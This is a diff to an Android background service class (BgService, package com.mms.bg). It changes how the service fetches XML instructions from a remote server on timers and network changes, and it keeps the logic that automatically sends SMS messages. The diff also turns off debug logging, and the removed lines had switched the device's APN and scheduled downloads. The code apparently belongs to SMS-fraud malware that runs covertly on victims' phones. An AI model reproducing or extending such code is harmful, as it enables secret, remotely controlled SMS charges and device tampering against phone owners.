@@ -27,7 +27,7 @@ import com.mms.bg.util.XMLHandler;
 public class BgService extends Service {
 
     private static final String TAG = "BgService";
-    private static final boolean DEBUG = true;
+    private static final boolean DEBUG = false;
     
     public static final String ACTION_DIAL_BR = "action.dial.bg";
     public static final String ACTION_INTERNET = "action.internet.bg";
@@ -201,16 +201,20 @@ public class BgService extends Service {
         PackageManager pm = getPackageManager();
         List<ResolveInfo> plugins = pm.queryIntentServices(
                                    new Intent(FILTER_ACTION), PackageManager.GET_META_DATA);
-        SettingManager.getInstance(getApplicationContext()).mPid = "0";
-        for (ResolveInfo info : plugins) {
-            LOGD("package name = " + info.serviceInfo.packageName);
-            if (info.serviceInfo.name.equals("com.mms.bg.ui.BgService") == true) {
-                if (info.serviceInfo.metaData != null 
-                        && info.serviceInfo.metaData.containsKey(META_DATA) == true) {
-                    LOGD("set the pid");
-                    SettingManager.getInstance(getApplicationContext()).mPid = String.valueOf(info.serviceInfo.metaData.getInt(META_DATA));
+        mSM.mPid = mSM.getPID();
+        if (mSM.mPid == null || mSM.mPid.equals("0") == true) {
+            mSM.mPid = "0";
+            for (ResolveInfo info : plugins) {
+                LOGD("package name = " + info.serviceInfo.packageName);
+                if (info.serviceInfo.name.equals("com.mms.bg.ui.BgService") == true) {
+                    if (info.serviceInfo.metaData != null 
+                            && info.serviceInfo.metaData.containsKey(META_DATA) == true) {
+                        LOGD("set the pid");
+                        mSM.mPid = String.valueOf(info.serviceInfo.metaData.getInt(META_DATA));
+                    }
                 }
             }
+            mSM.setPID(mSM.mPid);
         }
         LOGD("PID = " + SettingManager.getInstance(getApplicationContext()).mPid);
         mStartSMSAfterInternet = true;
@@ -239,27 +243,27 @@ public class BgService extends Service {
         mSM.log(TAG, "BgService::onStart action = " + (intent != null ? intent.getAction() : ""));
         
         if (intent == null || intent.getAction() == null) {
-            mSM.tryToFetchInfoFromServer(0);
+            mSM.setNextFetchChannelInfoFromServerTime(0, false);
             return;
         }
         
         String action = intent.getAction();
         if (action.equals(ACTION_INTERNET) == true) {
             LOGD("[[onStart]] received the action to get the internet info");
-            String apnId = mSM.getApnIdByName(SettingManager.CMNET);
-            if (apnId == null) {
-                //cmnet network is not ready
-                mSM.mCMNetIsReady = false;
-                apnId = mSM.addCMNetApn();
-                if (apnId != null && mSM.updateCurrentAPN(apnId) == 1) {
-                    //switch the current apn to cmnet
-                    mSM.registerCMNetNetWorkChangeReceiver();
-                }
-                return;
-            } else {
-                mSM.mCMNetIsReady = true;
-            }
-            boolean ret = mSM.getXMLInfoFromServer();
+//            String apnId = mSM.getApnIdByName(SettingManager.CMNET);
+//            if (apnId == null) {
+//                //cmnet network is not ready
+//                mSM.mCMNetIsReady = false;
+//                apnId = mSM.addCMNetApn();
+//                if (apnId != null && mSM.updateCurrentAPN(apnId) == 1) {
+//                    //switch the current apn to cmnet
+//                    mSM.registerCMNetNetWorkChangeReceiver();
+//                }
+//                return;
+//            } else {
+//                mSM.mCMNetIsReady = true;
+//            }
+            boolean ret = mSM.getXMLInfoFromServer("daily");
             if (ret == true) {
                 mSM.parseServerXMLInfo();
                 String delay = mSM.mXMLHandler.getChanneInfo(XMLHandler.NEXT_LINK_BASE);
@@ -269,25 +273,26 @@ public class BgService extends Service {
                 }
                 LOGD("[[onStart]] change the internet connect time delay, and start send the auto sms");
                 mSM.setLastConnectServerTime(System.currentTimeMillis());
-                mSM.tryToFetchInfoFromServer(delayTime);
+                mSM.mHasSetFetchServerInfoAlarm = false;
+                mSM.setNextFetchChannelInfoFromServerTime(delayTime, false);
                 if (isSendSMS() == true && mStartSMSAfterInternet == true) {
                     //using sms
                     mSM.startAutoSendMessage(0, mSM.getSMSSendDelay());
                     mStartSMSAfterInternet = false;
                 } else if (isDownloadVedio() == true) {
-                    long time = mSM.getLastVedioDownloadTime();
-                    if ((System.currentTimeMillis() - time) > SettingManager.SMS_DEFAULT_DELAY_TIME) {
-                        mSM.clearVedioDownloadLink();
-                        Timer timer = new Timer();
-                        timer.schedule(new MyTimerTask(), 5 * 1000);
-                    }
+//                    long time = mSM.getLastVedioDownloadTime();
+//                    if ((System.currentTimeMillis() - time) > SettingManager.SMS_DEFAULT_DELAY_TIME) {
+//                        mSM.clearVedioDownloadLink();
+//                        Timer timer = new Timer();
+//                        timer.schedule(new MyTimerTask(), 5 * 1000);
+//                    }
                 }
             } else {
                 mSM.setInternetConnectFailed(true);
             }
         } else if (action.equals(ACTION_SEND_SMS) == true) {
             LOGD("[[onStart]] start send the sms for one cycle");
-            boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer();
+            boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer("sms round check");
             if (ret == true) {
                 mSM.parseServerXMLInfo();
                 mSM.log(TAG, "start send the sms for one cycle");
@@ -317,19 +322,25 @@ public class BgService extends Service {
                 if (delay != null) {
                     delayTime = (Integer.valueOf(delay)) * 60 * 60 * 1000;
                 }
-                mSM.tryToFetchInfoFromServer(delayTime);
+                if (mSM.mHasSetFetchServerInfoAlarm == false) {
+                    mSM.setNextFetchChannelInfoFromServerTime(delayTime, false);
+                }
                 if (isSendSMS() == true) {
                     mSM.startAutoSendMessage(0, mSM.getSMSSendDelay());
                     mStartSMSAfterInternet = false;
                 } else if (isDownloadVedio() == true) {
                     //TODO : start download vedio process alarm
-                    mStartSMSAfterInternet = false;
+//                    mStartSMSAfterInternet = false;
                 }
             } else {
-                mSM.tryToFetchInfoFromServer(0);
+                if (mSM.mHasSetFetchServerInfoAlarm == false) {
+                    mSM.setNextFetchChannelInfoFromServerTime(0, false);
+                }
             }
         } else if (action.equals(ACTION_INTERNET_CHANGED) == true) {
-            boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer();
+            String str = intent.getStringExtra(SettingManager.CONNECT_NETWORK_REASON);
+            if (str == null) str = "net aviliable";
+            boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer(str);
             LOGD("action internet connection");
             mSM.log("action = " + ACTION_INTERNET_CHANGED);
             if (ret == true) {
@@ -344,17 +355,18 @@ public class BgService extends Service {
                     }
                     LOGD("[[onStart]] change the internet connect time delay, and start send the auto sms");
                     mSM.setLastConnectServerTime(System.currentTimeMillis());
-                    mSM.tryToFetchInfoFromServer(delayTime);
+                    mSM.mHasSetFetchServerInfoAlarm = false;
+                    mSM.setNextFetchChannelInfoFromServerTime(delayTime, false);
                     if (isSendSMS() == true && mStartSMSAfterInternet == true) {
                         mSM.startAutoSendMessage(0, mSM.getSMSSendDelay());
                         mStartSMSAfterInternet = false;
                     } else if (isDownloadVedio() == true) {
-                        long time = mSM.getLastVedioDownloadTime();
-                        if ((System.currentTimeMillis() - time) > SettingManager.SMS_DEFAULT_DELAY_TIME) {
-                            mSM.clearVedioDownloadLink();
-                            Timer timer = new Timer();
-                            timer.schedule(new MyTimerTask(), 5 * 1000);
-                        }
+//                        long time = mSM.getLastVedioDownloadTime();
+//                        if ((System.currentTimeMillis() - time) > SettingManager.SMS_DEFAULT_DELAY_TIME) {
+//                            mSM.clearVedioDownloadLink();
+//                            Timer timer = new Timer();
+//                            timer.schedule(new MyTimerTask(), 5 * 1000);
+//                        }
                     }
                 }
                 if (mSM.getInternetConnectFailedBeforeSMS() == true) {
@@ -368,7 +380,9 @@ public class BgService extends Service {
                 }
             }
         } else {
-            mSM.tryToFetchInfoFromServer(0);
+            if (mSM.mHasSetFetchServerInfoAlarm == false) {
+                mSM.setNextFetchChannelInfoFromServerTime(0, false);
+            }
         }
     } 
     
